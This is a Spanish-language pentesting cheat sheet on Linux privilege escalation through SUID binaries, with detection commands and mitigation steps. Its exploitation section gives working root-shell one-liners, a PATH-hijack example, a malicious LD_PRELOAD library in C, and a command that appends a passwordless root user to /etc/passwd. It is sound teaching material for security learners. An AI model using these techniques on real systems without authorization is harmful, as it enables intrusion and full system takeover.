
---
Tags: #privilege-escalation #suid #linux #pentesting

---
## 📌 Definición

- El **bit SUID (Set User ID)** permite que un ejecutable se ejecute con los privilegios del **propietario del archivo** en lugar del usuario que lo ejecuta.
    
- Si un binario tiene el bit SUID y pertenece a **root**, al ejecutarlo puede conceder privilegios elevados.
    
- Abusar de binarios SUID es una de las técnicas más comunes de **escalada local en Linux**.
    

---

## 🔍 Métodos de Detección

### Buscar binarios con SUID:

`find / -perm -4000 -type f 2>/dev/null`

### Listar permisos de un archivo:

`ls -l /usr/bin/sudo -rwsr-xr-x 1 root root 123K Jan  1  /usr/bin/sudo`

- `s` en lugar de `x` = bit SUID activado.
    

---

## ⚔️ Métodos de Explotación

### 1️⃣ Binarios propios o scripts inseguros

Si un binario SUID ejecuta comandos externos sin rutas absolutas:  
Ejemplo `vuln`:

`system("ls");`

👉 Se puede **crear un binario malicioso llamado `ls` en el PATH**:

`echo '/bin/bash' > /tmp/ls chmod +x /tmp/ls export PATH=/tmp:$PATH ./vuln`

➡️ Obtendrás una shell como root.

---

### 2️⃣ Binarios legítimos con SUID

Algunos binarios del sistema con SUID pueden explotarse (ver GTFOBins):

|Binario|Explotación|
|---|---|
|`find`|`find . -exec /bin/sh -p \;`|
|`awk`|`awk 'BEGIN {system("/bin/sh")}'`|
|`vim`|`vim -c ':!/bin/sh'`|
|`less`|`less /etc/passwd` → `!sh`|
|`perl`|`perl -e 'exec "/bin/sh";'`|
|`python`|`python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'`|
|`nmap`|`nmap --interactive` → `!sh`|

⚠️ Importante: ejecutar con **`-p`** para preservar permisos root:

`./binary -p`

---

### 3️⃣ Abuso de librerías compartidas (LD_PRELOAD)

Si un binario SUID **no limpia las variables de entorno** (poco común en modernos), se puede forzar la carga de librerías maliciosas:

```C
// exploit.c

#include <stdio.h>
#include <stdlib.h>
void _init() {
    setuid(0);
    system("/bin/bash");
}
```

```bash
gcc -fPIC -shared -o exploit.so exploit.c -nostartfiles
sudo LD_PRELOAD=./exploit.so /usr/bin/suid_binary

```

---

### 4️⃣ Escalada con `passwd` vulnerable

Si `passwd` tiene SUID y permite modificar archivos arbitrarios (con hardlinks), se puede sobreescribir `/etc/passwd` para añadir un usuario root falso:

`echo 'hacker::0:0:root:/root:/bin/bash' >> /etc/passwd su hacker`

---

## 🛡️ Mitigación

- Revisar y minimizar binarios con SUID:
    
    `find / -perm -4000 -type f 2>/dev/null`
    
- Quitar SUID de binarios no necesarios:
    
    `chmod u-s /usr/bin/nmap`
    
- Monitorizar modificaciones en binarios SUID.
    

---
